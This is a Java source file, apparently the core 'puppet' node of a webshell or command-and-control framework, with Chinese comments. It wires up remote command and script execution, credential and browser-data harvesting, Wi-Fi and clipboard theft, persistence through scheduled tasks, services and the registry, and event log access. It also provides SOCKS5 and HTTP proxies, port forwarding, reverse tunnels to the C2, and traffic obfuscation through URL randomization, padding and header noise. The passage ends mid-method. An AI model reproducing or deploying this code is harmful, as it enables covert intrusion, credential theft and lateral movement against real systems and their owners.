package org.leo.core.puppet.impl;

import org.leo.core.engine.forward.LocalForwardServer;
import org.leo.core.engine.http.HttpProxyServer;
import org.leo.core.engine.reverse.ReverseTunnelServer;
import org.leo.core.engine.socks5.Socks5ProxyServer;
import org.leo.core.engine.socks5.Socks5ProxyStatistics;
import org.leo.core.net.Communication;
import org.leo.core.net.layer.RequestLayer;
import org.leo.core.net.layer.ResponseLayer;
import org.leo.core.net.layer.UrlStrategy;
import org.leo.core.net.layer.PaddingStrategy;
import org.leo.core.net.layer.HeaderNoiseStrategy;
import org.leo.core.puppet.AbstractPuppetNode;
import org.leo.core.puppet.service.*;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Map;
import java.util.Set;

public class JavaPuppetNode extends AbstractPuppetNode {

    private int maxReqCount;

    List<RequestLayer> requestLayers = new ArrayList<>();
    List<ResponseLayer> responseLayers = new ArrayList<>();

    private HashMap<String, Set<String>> allLoadedComponent = new HashMap<String, Set<String>>();
    BasicInfoService basicInfoService;
    CommandService commandService;
    ComponentService componentService;
    FileService fileService;
    SqlService sqlService;
    TestConnService testConnService;
    ScanService scanService;
    ResourceService resourceService;
    CatalinaManageService catalinaManageService;
    ExecScriptService execScriptService;
    HttpRequestService httpRequestService;
    CredentialHarvestService credentialHarvestService;
    NetworkInfoService networkInfoService;
    HttpSenderService httpSenderService;
    ProcessService processService;
    RegistryService registryService;
    ScheduledTaskService scheduledTaskService;
    ServiceManagerService serviceManagerService;
    EventLogService eventLogService;
    UserAccountService userAccountService;
    FirewallService firewallService;
    NetworkShareService networkShareService;
    InstalledSoftwareService installedSoftwareService;
    DockerContainerService dockerContainerService;
    SuidCapabilityService suidCapabilityService;
    BrowserDataService browserDataService;
    WifiProfileService wifiProfileService;
    PersistenceService persistenceService;
    NetworkConnectionService networkConnectionService;
    MountDiskService mountDiskService;
    ClipboardService clipboardService;
    String hostId;

    private Communication communication;
    private Socks5ProxyServer socks5ProxyServer;
    private HttpProxyServer httpProxyServer;
    private final HashMap<Integer, LocalForwardServer> localForwardServers
            = new HashMap<Integer, LocalForwardServer>();
    private final HashMap<String, ReverseTunnelServer> reverseTunnels
            = new HashMap<String, ReverseTunnelServer>();

    /** per-puppet URL 随机化策略 */
    private UrlStrategy urlStrategy;

    /** per-puppet 请求体 Padding 策略 */
    private PaddingStrategy paddingStrategy;

    /** per-puppet Header 噪声注入策略 */
    private HeaderNoiseStrategy headerNoiseStrategy;

    public Communication getCommunication() {
        return communication;
    }

    public void setCommunication(Communication communication) {
        this.communication = communication;

    }


    public String getHostId() {
        return hostId;
    }


    public void setHostId(String hostId) {
        this.hostId = hostId;
        basicInfoService.setHostId(this.hostId);
        commandService.setHostId(this.hostId);
        componentService.setHostId(this.hostId);
        fileService.setHostId(this.hostId);
        sqlService.setHostId(this.hostId);
        testConnService.setHostId(this.hostId);
        scanService.setHostId(this.hostId);
        resourceService.setHostId(this.hostId);
        catalinaManageService.setHostId(this.hostId);
        execScriptService.setHostId(this.hostId);
        httpRequestService.setHostId(this.hostId);
        credentialHarvestService.setHostId(this.hostId);
        networkInfoService.setHostId(this.hostId);
        httpSenderService.setHostId(this.hostId);
        processService.setHostId(this.hostId);
        registryService.setHostId(this.hostId);
        scheduledTaskService.setHostId(this.hostId);
        serviceManagerService.setHostId(this.hostId);
        eventLogService.setHostId(this.hostId);
        userAccountService.setHostId(this.hostId);
        firewallService.setHostId(this.hostId);
        networkShareService.setHostId(this.hostId);
        installedSoftwareService.setHostId(this.hostId);
        dockerContainerService.setHostId(this.hostId);
        suidCapabilityService.setHostId(this.hostId);
        browserDataService.setHostId(this.hostId);
        wifiProfileService.setHostId(this.hostId);
        persistenceService.setHostId(this.hostId);
        networkConnectionService.setHostId(this.hostId);
        mountDiskService.setHostId(this.hostId);
        clipboardService.setHostId(this.hostId);
    }
    public void initService(){
        basicInfoService=new BasicInfoService(communication,requestLayers,responseLayers);
        commandService=new CommandService(communication,requestLayers,responseLayers);
        componentService=new ComponentService(communication,requestLayers,responseLayers);
        fileService=new FileService(communication,requestLayers,responseLayers);
        sqlService=new SqlService(communication,requestLayers,responseLayers);
        testConnService=new TestConnService(communication,requestLayers,responseLayers);
        scanService=new ScanService(communication,requestLayers,responseLayers);
        resourceService=new ResourceService(communication,requestLayers,responseLayers);
        catalinaManageService=new CatalinaManageService(communication,requestLayers,responseLayers);
        execScriptService=new ExecScriptService(communication,requestLayers,responseLayers);
        httpRequestService=new HttpRequestService(communication,requestLayers,responseLayers);
        credentialHarvestService=new CredentialHarvestService(communication,requestLayers,responseLayers);
        networkInfoService=new NetworkInfoService(communication,requestLayers,responseLayers);
        httpSenderService=new HttpSenderService(communication,requestLayers,responseLayers);
        processService=new ProcessService(communication,requestLayers,responseLayers);
        registryService=new RegistryService(communication,requestLayers,responseLayers);
        scheduledTaskService=new ScheduledTaskService(communication,requestLayers,responseLayers);
        serviceManagerService=new ServiceManagerService(communication,requestLayers,responseLayers);
        eventLogService=new EventLogService(communication,requestLayers,responseLayers);
        userAccountService=new UserAccountService(communication,requestLayers,responseLayers);
        firewallService=new FirewallService(communication,requestLayers,responseLayers);
        networkShareService=new NetworkShareService(communication,requestLayers,responseLayers);
        installedSoftwareService=new InstalledSoftwareService(communication,requestLayers,responseLayers);
        dockerContainerService=new DockerContainerService(communication,requestLayers,responseLayers);
        suidCapabilityService=new SuidCapabilityService(communication,requestLayers,responseLayers);
        browserDataService=new BrowserDataService(communication,requestLayers,responseLayers);
        wifiProfileService=new WifiProfileService(communication,requestLayers,responseLayers);
        persistenceService=new PersistenceService(communication,requestLayers,responseLayers);
        networkConnectionService=new NetworkConnectionService(communication,requestLayers,responseLayers);
        mountDiskService=new MountDiskService(communication,requestLayers,responseLayers);
        clipboardService=new ClipboardService(communication,requestLayers,responseLayers);

        // 将 URL 随机化策略下发到所有 Service
        applyUrlStrategyToAll();
        // 将 Padding 策略下发到所有 Service
        applyPaddingStrategyToAll();
        // 将 Header 噪声策略下发到所有 Service
        applyHeaderNoiseStrategyToAll();
        // 将 maxReqCount 下发到所有 Service
        applyMaxReqCountToAll();
    }

    /**
     * 设置 UrlStrategy 并同步到所有已初始化的 Service
     */
    public void setUrlStrategy(UrlStrategy urlStrategy) {
        this.urlStrategy = urlStrategy;
        applyUrlStrategyToAll();
    }

    public UrlStrategy getUrlStrategy() {
        return urlStrategy;
    }

    /**
     * 设置 PaddingStrategy 并同步到所有已初始化的 Service
     */
    public void setPaddingStrategy(PaddingStrategy paddingStrategy) {
        this.paddingStrategy = paddingStrategy;
        applyPaddingStrategyToAll();
    }

    public PaddingStrategy getPaddingStrategy() {
        return paddingStrategy;
    }

    /**
     * 设置 HeaderNoiseStrategy 并同步到所有已初始化的 Service
     */
    public void setHeaderNoiseStrategy(HeaderNoiseStrategy headerNoiseStrategy) {
        this.headerNoiseStrategy = headerNoiseStrategy;
        applyHeaderNoiseStrategyToAll();
    }

    public HeaderNoiseStrategy getHeaderNoiseStrategy() {
        return headerNoiseStrategy;
    }

    private void applyUrlStrategyToAll() {
        if (urlStrategy == null) return;
        ComponentService[] services = getAllComponentServices();
        for (ComponentService svc : services) {
            if (svc != null) {
                svc.setUrlStrategy(urlStrategy);
            }
        }
    }

    private void applyPaddingStrategyToAll() {
        if (paddingStrategy == null) return;
        ComponentService[] services = getAllComponentServices();
        for (ComponentService svc : services) {
            if (svc != null) {
                svc.setPaddingStrategy(paddingStrategy);
            }
        }
    }

    private void applyHeaderNoiseStrategyToAll() {
        if (headerNoiseStrategy == null) return;
        ComponentService[] services = getAllComponentServices();
        for (ComponentService svc : services) {
            if (svc != null) {
                svc.setHeaderNoiseStrategy(headerNoiseStrategy);
            }
        }
    }

    private void applyMaxReqCountToAll() {
        if (maxReqCount <= 0) return;
        ComponentService[] services = getAllComponentServices();
        for (ComponentService svc : services) {
            if (svc != null) {
                svc.setMaxReqCount(maxReqCount);
            }
        }
    }

    public void addLoadedComponent(String hostId, Set<String> loadedComponent){
        allLoadedComponent.put(hostId,loadedComponent);
        // 同步到所有 ComponentService 实例，避免重复加载
        syncLoadedComponentsToServices(hostId, loadedComponent);
    }

    private void syncLoadedComponentsToServices(String hostId, Set<String> componentNames) {
        if (hostId == null || componentNames == null) return;
        ComponentService[] services = getAllComponentServices();
        for (ComponentService svc : services) {
            if (svc != null) {
                svc.seedLoadedComponents(hostId, componentNames);
            }
        }
    }

    private ComponentService[] getAllComponentServices() {
        return new ComponentService[]{
            basicInfoService, commandService, componentService, fileService,
            sqlService, testConnService, scanService, resourceService,
            catalinaManageService, execScriptService, httpRequestService,
            credentialHarvestService, networkInfoService, httpSenderService,
            processService, registryService, scheduledTaskService,
            serviceManagerService, eventLogService, userAccountService,
            firewallService, networkShareService, installedSoftwareService,
            dockerContainerService, suidCapabilityService, browserDataService,
            wifiProfileService, persistenceService, networkConnectionService,
            mountDiskService, clipboardService
        };
    }

    public Socks5ProxyServer getSocks5ProxyServer() {
        return socks5ProxyServer;
    }

    public void setSocks5ProxyServer(Socks5ProxyServer socks5ProxyServer) {
        this.socks5ProxyServer = socks5ProxyServer;
    }

    public List<RequestLayer> getRequestLayers() {
        return requestLayers;
    }

    public void setRequestLayers(List<RequestLayer> requestLayers) {
        this.requestLayers = requestLayers;
    }

    public List<ResponseLayer> getResponseLayers() {
        return responseLayers;
    }

    public void setResponseLayers(List<ResponseLayer> responseLayers) {
        this.responseLayers = responseLayers;
    }

    public int getMaxReqCount() {
        return maxReqCount;
    }



    public void setMaxReqCount(int maxReqCount) {
        this.maxReqCount = maxReqCount;
    }

    @Override
    public Set<String> getLoadedComponents() {
        // 聚合所有 ComponentService 实例的已加载组件，避免仅读单一 service 导致漏显
        Set<String> merged = new HashSet<String>();
        if (hostId != null) {
            ComponentService[] services = getAllComponentServices();
            for (ComponentService svc : services) {
                if (svc != null) {
                    merged.addAll(svc.getLoadedComponentNames(hostId));
                }
            }
        }
        if (!merged.isEmpty()) return merged;
        // fallback: 从旧的本地缓存读取
        Set<String> set = allLoadedComponent.get(hostId);
        return set != null ? set : new HashSet<String>();
    }

    @Override
    public Map<String, Object> invokeComponent(String componentId, Map<String, Object> params) throws Exception {
        return componentService.invokeComponent(componentId,params);
    }




    @Override
    public Map<String, Object> testConnection() {
        return testConnService.testConn();
    }


    public Map<String, Object> getBasicInfo() throws Exception {
        return basicInfoService.basicInfo();
    }

    public Map<String, Object> startScanPort(String scanHost, int[] scanPorts, int scanTimeout, int threadsNum) throws Exception {
        return scanService.startScanPort(scanHost, scanPorts, scanTimeout, threadsNum);
    }

    public Map<String, Object> queryScanPortResult(String taskId) throws Exception {
        return scanService.queryScanPortResult(taskId);
    }

    public Map<String, Object> pauseScanPort(String taskId) throws Exception {
        return scanService.pauseScanPort(taskId);
    }

    public Map<String, Object> resumeScanPort(String taskId) throws Exception {
        return scanService.resumeScanPort(taskId);
    }

    public Map<String, Object> stopScanPort(String taskId) throws Exception {
        return scanService.stopScanPort(taskId);
    }

    public Map<String, Object> scanReachableHost(ArrayList scanHostsList, int scanTimeout) throws Exception {
        return scanService.scanReachableHost(scanHostsList, scanTimeout);
    }

    public Map<String, Object> loadComponent(String componentId) throws Exception {
        return componentService.loadComponent(componentId);

    }

    @Override
    public void unloadComponent(String componentId) throws Exception {

    }

    public Map<String, Object> getFileList(String path) throws Exception {
        return fileService.getFileList(path);
    }

    public Map<String, Object> getRootList() throws Exception {
        return fileService.getRootList();
    }

    public Map<String, Object> fileDownloadChunk(String path, long size, long offset) throws Exception {
        return fileService.fileDownloadChunk(path, size, offset);
    }

    public Map<String, Object> fileUploadChunk(String path, long offset, byte[] data) throws Exception {
        return fileService.fileUploadChunk(path, offset, data);
    }

    public Map<String, Object> getFileMD5(String path) throws Exception {
        return fileService.getFileMD5(path);
    }

    public Map<String, Object> createDir(String dirName) throws Exception {
        return fileService.createDir(dirName);
    }

    public Map<String, Object> deleteFile(String path) throws Exception {
        return fileService.deleteFile(path);
    }

    public Map<String, Object> copyFile(String srcPath, String destPath) throws Exception {
        return fileService.copyFile(srcPath, destPath);
    }

    public Map<String, Object> copyFile(String srcPath, String destPath, String conflictStrategy) throws Exception {
        return fileService.copyFile(srcPath, destPath, conflictStrategy);
    }

    public Map<String, Object> moveFile(String srcPath, String newPath) throws Exception {
        return fileService.moveFile(srcPath, newPath);
    }

    public Map<String, Object> moveFile(String srcPath, String newPath, String conflictStrategy) throws Exception {
        return fileService.moveFile(srcPath, newPath, conflictStrategy);
    }

    public Map<String, Object> createFile(String path, String content) throws Exception {
        return fileService.createFile(path, content);
    }

    public Map<String, Object> compressFile(String src, String des, String excludePattern) throws Exception {
        return fileService.compress(src, des, excludePattern);
    }

    public Map<String, Object> editFile(String path, String content) throws Exception {
        return fileService.editFile(path, content);
    }

    public Map<String, Object> decompressFile(String src, String des) throws Exception {
        return fileService.decompress(src, des);
    }

    public Map<String, Object> execCommand(String type, String cmd, String processId) throws Exception {
        if ("write".equals(type)) return commandService.write(cmd, processId);
        if ("read".equals(type))  return commandService.read(processId);
        if ("stop".equals(type))  return commandService.stop(processId);
        return new HashMap<String, Object>();
    }
    public Map<String, Object> execSimpleCommand(String cmd) throws Exception {
        return commandService.execSimpleCommand(cmd);
    }

    public Map<String, Object> execScript(String language, String script) throws Exception {
        return execScriptService.execScript(language, script);
    }

    public Map<String, Object> execSql(String driverClassName, String jdbcUrl, String user, String password, String sqlScript) throws Exception {
        return sqlService.execSql(driverClassName, jdbcUrl, user, password, sqlScript);
    }

    public Map<String, Object> getClassBytecode(String className) throws Exception {
        return resourceService.getClassBytecode(className);
    }

    public Map<String, Object> getResource(String resourcePath) throws Exception {
        return resourceService.getResource(resourcePath);
    }
    public Map<String, Object> getCatalinaInfo(String catalinaName, String webFramework) throws Exception {
        return catalinaManageService.getCatalinaInfo(catalinaName, webFramework);
    }

    public Map<String, Object> unloadCatalinaFilter(String catalinaName, String contextName, String filterName) throws Exception {
        return catalinaManageService.unloadFilter(catalinaName, contextName, filterName);
    }

    public Map<String, Object> unloadCatalinaServlet(String catalinaName, String contextName, String servletPattern) throws Exception {
        return catalinaManageService.unloadServlet(catalinaName, contextName, servletPattern);
    }

    public Map<String, Object> unloadCatalinaValve(String catalinaName, String valveId) throws Exception {
        return catalinaManageService.unloadValve(catalinaName, valveId);
    }

    public Map<String, Object> unloadCatalinaListener(String catalinaName, String listenerId) throws Exception {
        return catalinaManageService.unloadListener(catalinaName, listenerId);
    }

    public Map<String, Object> unloadSpringController(String webFramework, String mappingInfo) throws Exception {
        return catalinaManageService.unloadController(webFramework, mappingInfo);
    }

    public Map<String, Object> unloadSpringInterceptor(String webFramework, String interceptorId) throws Exception {
        return catalinaManageService.unloadInterceptor(webFramework, interceptorId);
    }

    public synchronized Map<String, Object> startSocks5Proxy(int port) throws Exception {
        HashMap<String, Object> res = new HashMap<String, Object>();
        if (socks5ProxyServer != null) {
            res.put("code", 200);
            res.put("msg", "already running");
            return res;
        }
        Socks5ProxyServer server = new Socks5ProxyServer(this, port);
        server.start();
        this.socks5ProxyServer = server;
        res.put("code", 200);
        res.put("msg", "started");
        res.put("port", port);
        return res;
    }

    public synchronized Map<String, Object> stopSocks5Proxy() {
        HashMap<String, Object> res = new HashMap<String, Object>();
        if (socks5ProxyServer == null) {
            res.put("code", 200);
            res.put("msg", "not running");
            return res;
        }
        try {
            socks5ProxyServer.stop();
        } catch (Exception e) {
            // 忽略停止代理服务器时的异常
        }
        socks5ProxyServer = null;
        res.put("code", 200);
        res.put("msg", "stopped");
        return res;
    }

    /**
     * 获取SOCKS5代理统计信息
     * @return 统计信息快照，如果代理未启动则返回null
     */
    public synchronized Socks5ProxyStatistics.StatisticsSnapshot getSocks5ProxyStatistics() {
        if (socks5ProxyServer == null) {
            return null;
        }
        Socks5ProxyStatistics stats = socks5ProxyServer.getStatistics();
        if (stats == null) {
            return null;
        }
        return stats.getSnapshot();
    }

    // ==================== HTTP 代理 ====================

    /**
     * 启动 HTTP 代理服务器
     */
    public synchronized Map<String, Object> startHttpProxy(int port) throws Exception {
        Map<String, Object> res = new HashMap<String, Object>();
        if (httpProxyServer != null && httpProxyServer.isRunning()) {
            res.put("code", 400);
            res.put("msg", "HTTP proxy already running on port " + httpProxyServer.getListenPort());
            return res;
        }
        httpProxyServer = new HttpProxyServer(this, port);
        httpProxyServer.start();
        res.put("code", 200);
        res.put("msg", "started");
        res.put("port", port);
        return res;
    }

    /**
     * 停止 HTTP 代理服务器
     */
    public synchronized Map<String, Object> stopHttpProxy() {
        Map<String, Object> res = new HashMap<String, Object>();
        if (httpProxyServer == null || !httpProxyServer.isRunning()) {
            res.put("code", 400);
            res.put("msg", "HTTP proxy not running");
            return res;
        }
        httpProxyServer.stop();
        httpProxyServer = null;
        res.put("code", 200);
        res.put("msg", "stopped");
        return res;
    }

    /**
     * 获取 HTTP 代理状态
     */
    public synchronized Map<String, Object> getHttpProxyStatus() {
        Map<String, Object> res = new HashMap<String, Object>();
        if (httpProxyServer != null && httpProxyServer.isRunning()) {
            res.put("running", true);
            res.put("port", httpProxyServer.getListenPort());
        } else {
            res.put("running", false);
        }
        return res;
    }

    /**
     * 获取 HTTP 代理统计信息
     */
    public synchronized Socks5ProxyStatistics.StatisticsSnapshot getHttpProxyStatistics() {
        if (httpProxyServer == null) return null;
        Socks5ProxyStatistics stats = httpProxyServer.getStatistics();
        return stats == null ? null : stats.getSnapshot();
    }

    // ==================== 本地端口转发 ====================

    /**
     * 启动本地端口转发
     */
    public synchronized Map<String, Object> startLocalForward(int localPort, String targetHost, int targetPort) throws Exception {
        Map<String, Object> res = new HashMap<String, Object>();
        if (localForwardServers.containsKey(localPort)) {
            res.put("code", 400);
            res.put("msg", "Forward rule already exists for local port " + localPort);
            return res;
        }
        // targetHost:targetPort 连通性预检，3s 超时
        try {
            java.net.Socket probe = new java.net.Socket();
            probe.connect(new java.net.InetSocketAddress(targetHost, targetPort), 3000);
            probe.close();
        } catch (Exception e) {
            res.put("code", 400);
            res.put("msg", "targetHost:targetPort unreachable: " + targetHost + ":" + targetPort + " (" + e.getMessage() + ")");
            return res;
        }
        LocalForwardServer srv = new LocalForwardServer(this, localPort, targetHost, targetPort);
        srv.start();
        localForwardServers.put(localPort, srv);
        res.put("code", 200);
        res.put("msg", "started");
        res.put("localPort", localPort);
        res.put("targetHost", targetHost);
        res.put("targetPort", targetPort);
        return res;
    }

    /**
     * 停止指定本地端口的转发
     */
    public synchronized Map<String, Object> stopLocalForward(int localPort) {
        Map<String, Object> res = new HashMap<String, Object>();
        LocalForwardServer srv = localForwardServers.remove(localPort);
        if (srv == null) {
            res.put("code", 400);
            res.put("msg", "No forward rule for local port " + localPort);
            return res;
        }
        srv.stop();
        res.put("code", 200);
        res.put("msg", "stopped");
        return res;
    }

    /**
     * 停止所有本地端口转发
     */
    public synchronized Map<String, Object> stopAllLocalForwards() {
        for (LocalForwardServer srv : localForwardServers.values()) {
            srv.stop();
        }
        int count = localForwardServers.size();
        localForwardServers.clear();
        Map<String, Object> res = new HashMap<String, Object>();
        res.put("code", 200);
        res.put("msg", "stopped " + count + " forward(s)");
        return res;
    }

    /**
     * 列出所有本地端口转发规则
     */
    public synchronized java.util.List<Map<String, Object>> listLocalForwards() {
        java.util.List<Map<String, Object>> list = new java.util.ArrayList<Map<String, Object>>();
        for (LocalForwardServer srv : localForwardServers.values()) {
            Map<String, Object> item = new HashMap<String, Object>();
            item.put("localPort", srv.getLocalPort());
            item.put("targetHost", srv.getTargetHost());
            item.put("targetPort", srv.getTargetPort());
            item.put("running", srv.isRunning());
            list.add(item);
        }
        return list;
    }

    /**
     * 获取指定本地端口转发的统计信息
     */
    public synchronized Socks5ProxyStatistics.StatisticsSnapshot getLocalForwardStatistics(int localPort) {
        LocalForwardServer srv = localForwardServers.get(localPort);
        if (srv == null) return null;
        Socks5ProxyStatistics stats = srv.getStatistics();
        return stats == null ? null : stats.getSnapshot();
    }

    // ==================== 反向隧道 ====================

    /**
     * 启动反向隧道：在 puppet 端监听 remoteListenPort，把进入的连接转发到 C2 侧的 forwardHost:forwardPort。
     */
    public synchronized Map<String, Object> startReverseTunnel(int remoteListenPort, String bindAddr,
                                                                String forwardHost, int forwardPort) throws Exception {
        Map<String, Object> res = new HashMap<String, Object>();
        // 同 puppet 同 remoteListenPort 不允许重复
        for (ReverseTunnelServer existing : reverseTunnels.values()) {
            if (existing.getRemoteListenPort() == remoteListenPort && existing.isRunning()) {
                res.put("code", 400);
                res.put("msg", "Reverse tunnel already running on remote port " + remoteListenPort);
                return res;
            }
        }
        // forwardHost:forwardPort 连通性预检，3s 超时
        try {
            java.net.Socket probe = new java.net.Socket();
            probe.connect(new java.net.InetSocketAddress(forwardHost, forwardPort), 3000);
            probe.close();
        } catch (Exception e) {
            res.put("code", 400);
            res.put("msg", "forwardHost:forwardPort unreachable: " + forwardHost + ":" + forwardPort + " (" + e.getMessage() + ")");
            return res;
        }
        ReverseTunnelServer server = new ReverseTunnelServer(this, remoteListenPort, bindAddr, forwardHost, forwardPort);
        // 注册死亡回调：puppet 端 listenId 消失时自动从 map 移除
        final String listenId = server.getListenId();
        server.setOnDead(() -> {
            reverseTunnels.remove(listenId);
        });
        server.start();
        reverseTunnels.put(server.getListenId(), server);
        res.put("code", 200);
        res.put("msg", "started");
        res.put("listenId", server.getListenId());
        res.put("remoteListenPort", remoteListenPort);
        res.put("bindAddr", server.getBindAddr());
        res.put("forwardHost", forwardHost);
        res.put("forwardPort", forwardPort);
        return res;
    }

    /**
     * 停止指定反向隧道
     */
    public synchronized Map<String, Object> stopReverseTunnel(String listenId) {
        Map<String, Object> res = new HashMap<String, Object>();
        ReverseTunnelServer srv = reverseTunnels.remove(listenId);
        if (srv == null) {
            res.put("code", 400);
            res.put("msg", "No reverse tunnel for listenId " + listenId);
            return res;
        }
        srv.stop();
        res.put("code", 200);
        res.put("msg", "stopped");
        return res;
    }

    /**
     * 停止所有反向隧道
     */
    public synchronized Map<String, Object> stopAllReverseTunnels() {
        for (ReverseTunnelServer srv : reverseTunnels.values()) {
            try { srv.stop(); } catch (Exception ignored) {}
        }
        int count = reverseTunnels.size();
        reverseTunnels.clear();
        Map<String, Object> res = new HashMap<String, Object>();
        res.put("code", 200);
        res.put("msg", "stopped " + count + " reverse tunnel(s)");
        return res;
    }

    /**
     * 列出所有反向隧道规则
     */
    public synchronized java.util.List<Map<String, Object>> listReverseTunnels() {
        java.util.List<Map<String, Object>> list = new java.util.ArrayList<Map<String, Object>>();
        for (ReverseTunnelServer srv : reverseTunnels.values()) {
            Map<String, Object> item = new HashMap<String, Object>();
            item.put("listenId", srv.getListenId());
            item.put("remoteListenPort", srv.getRemoteListenPort());
            item.put("bindAddr", srv.getBindAddr());
            item.put("forwardHost", srv.getForwardHost());
            item.put("forwardPort", srv.getForwardPort());
            item.put("running", srv.isRunning());
            item.put("startTime", srv.getStartTime());
            list.add(item);
        }
        return list;
    }

    /**
     * 获取指定反向隧道的统计信息
     */
    public synchronized Socks5ProxyStatistics.StatisticsSnapshot getReverseTunnelStatistics(String listenId) {
        ReverseTunnelServer srv = reverseTunnels.get(listenId);
        if (srv == null) return null;
        Socks5ProxyStatistics stats = srv.getStatistics();
        return stats == null ? null : stats.getSnapshot();
    }

    // ==================== HTTP 请求 ====================

    public Map<String, Object> httpRequest(String method, String url, Map<String, String> headers,
                                           String body, int connectTimeout, int readTimeout,
                                           boolean followRedirects) throws Exception {
        return httpRequestService.httpRequest(method, url, headers, body, connectTimeout, readTimeout, followRedirects);
    }

    public Map<String, Object> httpGet(String url, Map<String, String> headers) throws Exception {
        return httpRequestService.httpGet(url, headers);
    }

    public Map<String, Object> httpPost(String url, Map<String, String> headers, String body) throws Exception {
        return httpRequestService.httpPost(url, headers, body);
    }

    public Map<String, Object> httpHead(String url, Map<String, String> headers) throws Exception {
        return httpRequestService.httpHead(url, headers);
    }

    // ==================== 凭据采集 ====================

    public Map<String, Object> harvestCredentials(String filter) throws Exception {
        return credentialHarvestService.harvestAll(filter);
    }

    public Map<String, Object> harvestDataSources() throws Exception {
        return credentialHarvestService.harvestDataSources();
    }

    public Map<String, Object> harvestSystemProperties(String filter) throws Exception {
        return credentialHarvestService.harvestSystemProperties(filter);
    }

    public Map<String, Object> harvestEnvVars(String filter) throws Exception {
        return credentialHarvestService.harvestEnvVars(filter);
    }

    public Map<String, Object> harvestJndi() throws Exception {
        return credentialHarvestService.harvestJndi();
    }

    public Map<String, Object> harvestSpringEnv(String filter) throws Exception {
        return credentialHarvestService.harvestSpringEnv(filter);
    }

    // ==================== 网络信息 ====================

    public Map<String, Object> collectNetworkInfo() throws Exception {
        return networkInfoService.collectAll();
    }

    public Map<String, Object> collectNetworkInterfaces() throws Exception {
        return networkInfoService.collectInterfaces();
    }

    public Map<String, Object> collectArp() throws Exception {
        return networkInfoService.collectArp();
    }

    public Map<String, Object> collectRoutes() throws Exception {
        return networkInfoService.collectRoutes();
    }

    public Map<String, Object> collectDnsConfig() throws Exception {
        return networkInfoService.collectDnsConfig();
    }

    public Map<String, Object> collectHosts() throws Exception {
        return networkInfoService.collectHosts();
    }

    public Map<String, Object> resolveDns(String hostname) throws Exception {
        return networkInfoService.resolveDns(hostname);
    }

    // ==================== HTTP 发包（Repeater + Fuzzer） ====================

    public Map<String, Object> sendRawHttp(String rawHttp, String targetHost, int targetPort,
                                           boolean useTls, boolean followRedirects,
                                           int connectTimeout, int readTimeout) throws Exception {
        return httpSenderService.sendRawHttp(rawHttp, targetHost, targetPort, useTls, followRedirects, connectTimeout, readTimeout);
    }

    public Map<String, Object> startFuzz(String rawHttp, Map<String, List<String>> payloads,
                                         String targetHost, int targetPort, boolean useTls,
                                         int threads, int delayMs,
                                         Map<String, Object> matchRules) throws Exception {
        return httpSenderService.startFuzz(rawHttp, payloads, targetHost, targetPort, useTls, threads, delayMs, matchRules);
    }

    public Map<String, Object> queryFuzz(String taskId) {
        return httpSenderService.queryFuzz(taskId);
    }

    public Map<String, Object> stopFuzz(String taskId) {
        return httpSenderService.stopFuzz(taskId);
    }

    // ==================== 进程管理 ====================

    public Map<String, Object> listProcesses() throws Exception {
        return processService.listProcesses();
    }

    public Map<String, Object> findProcesses(String name, int pid, int port) throws Exception {
        return processService.find(name, pid, port);
    }

    public Map<String, Object> killProcess(int pid, boolean force) throws Exception {
        return processService.killProcess(pid, force);
    }

    // ==================== 注册表管理 ====================

    public Map<String, Object> queryRegistry(String keyPath, boolean recursive) throws Exception {
        return registryService.query(keyPath, recursive);
    }

    public Map<String, Object> searchRegistry(String keyPath, String pattern, String searchTarget, int maxResults) throws Exception {
        return registryService.search(keyPath, pattern, searchTarget, maxResults);
    }

    public Map<String, Object> addRegistry(String keyPath, String valueName, String valueType, String valueData, boolean force) throws Exception {
        return registryService.add(keyPath, valueName, valueType, valueData, force);
    }

    public Map<String, Object> deleteRegistry(String keyPath, String valueName, boolean force) throws Exception {
        return registryService.delete(keyPath, valueName, force);
    }

    public Map<String, Object> exportRegistry(String keyPath) throws Exception {
        return registryService.export(keyPath);
    }

    // ==================== 计划任务管理 ====================

    public Map<String, Object> listScheduledTasks() throws Exception {
        return scheduledTaskService.list();
    }

    public Map<String, Object> queryScheduledTask(String taskName) throws Exception {
        return scheduledTaskService.query(taskName);
    }

    public Map<String, Object> createScheduledTaskWindows(String taskName, String command, String schedule,
                                                           String modifier, String startTime, String startDate,
                                                           String runAs, boolean force) throws Exception {
        return scheduledTaskService.createWindows(taskName, command, schedule, modifier, startTime, startDate, runAs, force);
    }

    public Map<String, Object> createScheduledTaskLinux(String cronExpression, String command) throws Exception {
        return scheduledTaskService.createLinux(cronExpression, command);
    }

    public Map<String, Object> deleteScheduledTask(String taskName) throws Exception {
        return scheduledTaskService.delete(taskName);
    }

    public Map<String, Object> runScheduledTask(String taskName) throws Exception {
        return scheduledTaskService.run(taskName);
    }

    public Map<String, Object> enableScheduledTask(String taskName) throws Exception {
        return scheduledTaskService.enable(taskName);
    }

    public Map<String, Object> disableScheduledTask(String taskName) throws Exception {
        return scheduledTaskService.disable(taskName);
    }

    // ==================== 服务管理 ====================

    public Map<String, Object> listServices() throws Exception {
        return serviceManagerService.list();
    }

    public Map<String, Object> queryService(String serviceName) throws Exception {
        return serviceManagerService.query(serviceName);
    }

    public Map<String, Object> startService(String serviceName) throws Exception {
        return serviceManagerService.start(serviceName);
    }

    public Map<String, Object> stopService(String serviceName) throws Exception {
        return serviceManagerService.stop(serviceName);
    }

    public Map<String, Object> restartService(String serviceName) throws Exception {
        return serviceManagerService.restart(serviceName);
    }

    public Map<String, Object> enableService(String serviceName) throws Exception {
        return serviceManagerService.enable(serviceName);
    }

    public Map<String, Object> disableService(String serviceName) throws Exception {
        return serviceManagerService.disable(serviceName);
    }

    public Map<String, Object> createService(String serviceName, String binPath, String displayName, String startType) throws Exception {
        return serviceManagerService.create(serviceName, binPath, displayName, startType);
    }

    public Map<String, Object> deleteService(String serviceName) throws Exception {
        return serviceManagerService.delete(serviceName);
    }

    // ==================== 事件日志管理 ====================

    public Map<String, Object> listEventLogSources() throws Exception {
        return eventLogService.listSources();
    }

    public Map<String, Object> queryEventLog(String source, int maxEntries, String keyword,
                                             String level, String since, String until,
                                             String eventId) throws Exception {
        return eventLogService.query(source, maxEntries, keyword, level, since, until, eventId);
    }

    public Map<String, Object> queryEventLog(String source, int maxEntries, String keyword,
                                             String level, String since, String until,
                                             String eventId, String format) throws Exception {
        return eventLogService.query(source, maxEntries, keyword, level, since, until, eventId, format);
    }

    public Map<String, Object> queryEventLog(String source, int maxEntries, String keyword,
                                             String level, String since, String until,
                                             String eventId, String format, int maxBytes) throws Exception {
